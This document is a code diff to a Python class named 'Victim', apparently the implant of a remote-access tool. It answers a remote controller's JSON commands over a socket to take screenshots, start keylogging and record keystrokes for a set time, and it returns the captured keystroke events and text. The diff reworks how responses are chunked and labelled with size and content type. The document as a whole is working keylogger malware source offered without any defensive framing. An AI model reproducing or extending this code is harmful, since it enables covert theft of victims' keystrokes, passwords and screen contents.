@@ -58,10 +58,12 @@ class Victim:
         # for reading or writing
         self._sel.register(conn, events, data=data)
 
-    def send_preparation_message(self, sock, num_of_messages, status='pending'):
+    def send_preparation_message(self, sock, size, num_of_messages, status='preparation', content_type: str = "json"):
         response = json.dumps({
             'status': status,
-            'num_of_messages': num_of_messages
+            'num_of_messages': num_of_messages,
+            'content_type': content_type,
+            'size': size
         })
         sock.send(response.encode('utf-8'))
 
@@ -81,19 +83,23 @@ class Victim:
             string_data = data.outb.decode('utf-8')
             if data.outb.decode('utf-8'):
                 # get the proper response for the request
-                response = self.process_request(string_data)
-
+                response_dict = self.process_request(string_data)
+                response = json.dumps(response_dict)
                 # encode the response to bytes in utf-8
                 data.outb = response.encode('utf-8')
 
                 # calculate the number of messages required to send the bytes, considering the byte limit.
-                bytes_to_send = len(data.outb)
+                bytes_to_send = total_bytes = len(data.outb)
                 number_of_responses = bytes_to_send // SOCK_BYTE_LIMIT
                 if bytes_to_send % SOCK_BYTE_LIMIT != 0:
                     number_of_responses += 1
                 print(f"bytes: {bytes_to_send}, messages: {number_of_responses}")
-                if number_of_responses >= 1:
-                    self.send_preparation_message(sock, number_of_responses, status='pending')
+                self.send_preparation_message(sock,
+                                              size=total_bytes,
+                                              num_of_messages=number_of_responses,
+                                              status='preparation',
+                                              content_type=response_dict['type'])
+
                 while bytes_to_send >= SOCK_BYTE_LIMIT:
                     bytes_to_send -= SOCK_BYTE_LIMIT
                     sent = sock.send(data.outb[:SOCK_BYTE_LIMIT])  # Should be ready to write
@@ -104,33 +110,39 @@ class Victim:
                     print(f"sent the last {sent} bytes")
                     data.outb = b''
 
-    def _throw_error(self):
-        return json.dumps({'status': 'failure', 'info': 'Invalid request'})
+    def _throw_error(self, get_dict=False):
+        if get_dict:
+            return {'status': 'failure', 'info': 'Invalid request', 'type': 'json'}
+        return json.dumps({'status': 'failure', 'info': 'Invalid request', 'type': 'json'})
 
     def process_request(self, request: str):
         try:
             request_dict = json.loads(request)
         except json.JSONDecodeError:
-            return self._throw_error()
+            return self._throw_error(get_dict=True)
 
         if request_dict['type'] == 'request':
             if request_dict['resource'] == 'screenshot':
                 print("taking a screenshot")
-                return json.dumps({'status': 'success'})
+                return {'status': 'success', 'type': 'image/png'}
         elif request_dict['type'] == 'action':
             if request_dict['action'] == 'start_keylogging':
                 print("starting keylogging")
-                return json.dumps({'status': 'success'})
+                return {'status': 'success', 'type': 'json'}
             elif request_dict['action'] == 'log_for':
                 seconds = request_dict['duration']
                 print(f"logging for {seconds} seconds .. ")
                 my_key_logger.log_keys_for(seconds)
-                return json.dumps(
-                    {'status': 'success', 'events': my_key_logger.to_dicts(), 'string': my_key_logger.get_string_log()})
+                return {
+                    'status': 'success',
+                    'events': my_key_logger.to_dicts(),
+                    'string': my_key_logger.get_string_log(),
+                    'type': 'json'
+                }
             else:
-                return self._throw_error()
+                return self._throw_error(get_dict=True)
         else:
-            return self._throw_error()
+            return self._throw_error(get_dict=True)
 
     def run(self):
         try:
@@ -138,8 +150,8 @@ class Victim:
                 events = self._sel.select(timeout=None)
                 for key, mask in events:
                     if key.data is None:
-                        self.accept(key.fileobj)
-                    else:
+                        self.accept(key.fileobj)  # accept a new socket
+                    else:  # respond to a message
                         self.service_connection(key, mask)
         except KeyboardInterrupt:
             print("Caught keyboard interrupt, exiting")
